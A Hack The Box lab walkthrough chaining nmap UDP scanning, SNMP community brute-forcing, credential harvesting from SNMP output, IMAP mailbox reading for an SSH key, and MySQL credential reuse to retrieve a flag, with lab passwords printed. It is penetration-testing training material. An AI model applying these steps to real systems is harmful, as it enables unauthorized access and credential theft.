# HTB Footprinting Lab (Hard) – Full Walkthrough Notes

## 🎯 Target

```bash
export RHOST=10.129.26.52
```

---

# 🔎 1. Initial Enumeration

## TCP Scan

```bash
nmap -sV -sC -A $RHOST
```

### Findings:

* 22 → SSH
* 110 → POP3
* 143 → IMAP
* 993 → IMAPS
* 995 → POP3S

💡 Insight:

> Mail server → likely credential-based attack

---

## UDP Scan (CRITICAL STEP)

```bash
sudo nmap -sU --top-ports 100 -sV $RHOST
```

### Finding:

* 161 → SNMP

💡 Insight:

> Hidden attack surface → information leak

---

# 🔓 2. SNMP Enumeration

## Test default community

```bash
snmpwalk -v2c -c public $RHOST
```

## Brute-force community strings

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $RHOST
```

### Result:

```text
backup
```

---

## Dump SNMP data

```bash
snmpwalk -v2c -c backup $RHOST | tee snmpwalk.txt
```

## Extract credentials

```bash
grep -Ei 'user|pass|mail|login|credential' snmpwalk.txt
```

### Found:

```text
username: tom
password: NMds732Js2761
```

---

# 📧 3. IMAP Access

## Connect to IMAP

```bash
openssl s_client -connect ${RHOST}:143 -starttls imap
```

## Login & enumerate mailbox

```text
A001 LOGIN tom NMds732Js2761
A002 LIST "" "*"
A003 SELECT INBOX
A004 SEARCH ALL
A005 FETCH 1 BODY[]
A006 FETCH 2 BODY[]
A007 FETCH 3 BODY[]
```

### Result:

* Found **SSH private key**

---

# 🔑 4. SSH Access

## Save key

```bash
nano id_rsa
chmod 600 id_rsa
```

## SSH into box

```bash
ssh -i id_rsa tom@$RHOST
```

---

# 🔍 5. Post-Exploitation Enumeration

## Check users

```bash
cat /etc/passwd
```

## Check identity

```bash
id
whoami
hostname
```

---

## Check running DB services

```bash
ps aux | grep -Ei 'mysql|maria|postgres|sql'
```

➡️ Found:

* MySQL running

---

## Check listening ports

```bash
ss -lntp
```

➡️ Key:

* `127.0.0.1:3306` → MySQL (local only)

💡 Insight:

> Must access DB from inside

---

## Search for DB/config/mail files

```bash
find / -maxdepth 3 -type f 2>/dev/null | grep -Ei 'db|sql|sqlite|config|mail|backup'
```

---

## Check SQLite (no useful data)

```bash
find / -type f \( -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" \) 2>/dev/null
```

---

# 🔑 6. Key Discovery – MySQL History

```bash
cat ~/.mysql_history
```

### Found:

```text
show databases;
use users;
select * from users;
```

💡 Insight:

> DB name = `users`

---

# 🔓 7. MySQL Access

## Try login

```bash
mysql -u root -p
mysql -u tom -p
```

### Success:

```bash
mysql -u tom -p
```

Password:

```text
NMds732Js2761
```

---

# 🗄️ 8. Database Enumeration

## Show databases

```sql
SHOW DATABASES;
```

➡️ Found:

* `users`

---

## Use database

```sql
USE users;
```

---

## Extract HTB credentials

```sql
SELECT * FROM users WHERE username LIKE 'HTB';
```

---

# 🚩 9. Final Credentials

```text
username: HTB
password: cr3n4o7rzse7rzhnckhssncif7ds
```

---

# 🧠 Key Methodology

## Attack Chain

```text
Nmap → UDP scan → SNMP → creds → IMAP → SSH key → SSH → MySQL → HTB creds
```

---

## 🔑 Lessons Learned

### 1. Always scan UDP

* TCP looked "clean"
* Real entry = SNMP

---

### 2. Services are connected

* SNMP → credentials
* IMAP → key
* SSH → shell
* MySQL → final creds

---

### 3. Check history files

```bash
cat ~/.mysql_history
cat ~/.bash_history
```

---

### 4. Local services = gold

* MySQL not exposed externally
* Required shell access first

---

## 🧠 Personal Takeaways

* If stuck → check UDP
* If creds found → reuse everywhere
* If shell gained → check:

  * history files
  * configs
  * local services
